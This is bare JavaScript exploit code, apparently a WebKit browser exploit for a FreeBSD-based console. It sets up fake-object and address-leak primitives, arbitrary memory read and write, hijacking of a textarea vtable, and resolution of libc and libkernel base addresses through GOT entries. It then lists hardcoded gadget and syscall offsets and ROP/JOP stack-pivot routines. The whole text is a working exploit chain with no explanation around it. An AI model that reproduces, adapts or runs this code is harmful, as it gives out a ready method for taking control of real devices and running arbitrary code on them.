  // exploit
var leaker_obj = {a: 1234};
var leaker_arr = new Uint32Array(1024);

var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(1024);

write64(addrof(leaker_arr).add(16), addrof(leaker_obj));
write64(addrof(oob_master).add(16), addrof(oob_slave));

 // helpers
var i48_put = function(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
}
var i48_get = function(a) {
  return a[4] + a[5] * 4294967296;
}
var addrof = function(x) {
  leaker_obj.a = x;
  return i48_get(leaker_arr);
}
var fakeobj = function(x) {
  i48_put(x, leaker_arr);
  return leaker_obj.a;
}
var read_mem_setup = function(p, sz) {
  i48_put(p, oob_master);
  oob_master[6] = sz;
}
var read_mem = function(p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for(var i = 0; i < sz; i++) {
    arr.push(oob_slave[i]);
  }
  return arr;
}
var read_mem_s = function(p, sz) {
  read_mem_setup(p, sz);
  return "" + oob_slave;
}
var read_mem_b = function(p, sz) {
  read_mem_setup(p, sz);
  var b = new Uint8Array(sz);
  b.set(oob_slave);
  return b;
}
var read_mem_as_string = function(p, sz) {
  var x = read_mem_b(p, sz);
  var ans = '';
  for(var i = 0; i < x.length; i++) {
    ans += String.fromCharCode(x[i]);
  }
  return ans;
}
var write_mem = function(p, data) {
  i48_put(p, oob_master);
  oob_master[6] = data.length;
  for(var i = 0; i < data.length; i++) {
    oob_slave[i] = data[i];
  }
}
var read_ptr_at = function(p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for(var i = 7; i >= 0; i--) {
    ans = 256 * ans + d[i];
  }
  return ans;
}
var write_ptr_at = function(p, d) {
  var arr = [];
  for(var i = 0; i < 8; i++) {
    arr.push(d & 0xff);
    d /= 256;
  }
  write_mem(p, arr);
}
var hex = function(x) {
  return (new Number(x)).toString(16);
}

 // maloc
var malloc_nogc = [];
function malloc(sz) {
  var arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr)+0x10);
}
 // rop
var tarea = document.createElement('textarea');
var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);
var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
var plt_ptr = read_ptr_at(fake_vtable) - 10142888;
function get_got_addr(idx) {
  var p = plt_ptr + idx * 16;
  var q = read_mem(p, 6);
  if(q[0] != 0xff || q[1] != 0x25) {
    throw "invalid GOT entry";
  }
  var offset = 0;
  for(var i = 5; i >= 2; i--) {
    offset = offset * 256 + q[i];
  }
  offset += p + 6;
  return read_ptr_at(offset);
}
var webkit_base = read_ptr_at(fake_vtable) - 0x900000;
var libkernel_base = get_got_addr(789);
var libc_base = get_got_addr(573);
var saveall_addr = libc_base + 0x22a94;
var loadall_addr = libc_base + 0x26ee8;
var pivot_addr = libc_base + 0x26f5e;
var infloop_addr = libc_base + 0x393f0;
var jop_frame_addr = libc_base + 0x669b0;
var get_errno_addr_addr = libkernel_base + 0x11810;
var pthread_create_addr = libkernel_base + 0x17190;
var read_addr = libkernel_base + 0x28190;
var write_addr = libkernel_base + 0x28450;
var open_addr = libkernel_base + 0x27d80;
var close_addr = libkernel_base + 0x27a20;
var getpid_addr = libkernel_base + 0x27480;
var setuid_addr = libkernel_base + 0x271e0;
var recvmsg_addr = libkernel_base + 0x277b0;
var sendmsg_addr = libkernel_base + 0x28df0;
var recvfrom_addr = libkernel_base + 0x27f30;
var accept_addr = libkernel_base + 0x285c0;
var getsockname_addr = libkernel_base + 0x27e00;
var select_addr = libkernel_base + 0x27ba0;
var socket_addr = libkernel_base + 0x26880;
var connect_addr = libkernel_base + 0x26d60;
var bind_addr = libkernel_base + 0x27f90;
var listen_addr = libkernel_base + 0x28990;
var sendto_addr = libkernel_base + 0x28860;
var socketpair_addr = libkernel_base + 0x26920;
var nanosleep_addr = libkernel_base + 0x27b80;
var mmap_addr = libkernel_base + 0x28090;
var lseek_addr = libkernel_base + 0x27690;
var cpuset_setaffinity_addr = libkernel_base + 0x27530;
var randomized_path_addr = libkernel_base + 0x28530;

function saveall() {
  var ans = malloc(0x800);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  tarea.scrollLeft = 0;
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
  tarea.scrollLeft = 0;
  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  return ans;
}
function pivot(buf) {
  var ans = malloc(0x400);
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
  tarea.scrollLeft = 0;
  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
  var bak = read_ptr_at(fake_vtable + 0x1d8);
  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
  write_ptr_at(fake_vt_ptr + 0x38, buf);
  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
  write_ptr_at(buf, ans);
  tarea.scrollLeft = 0;
  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
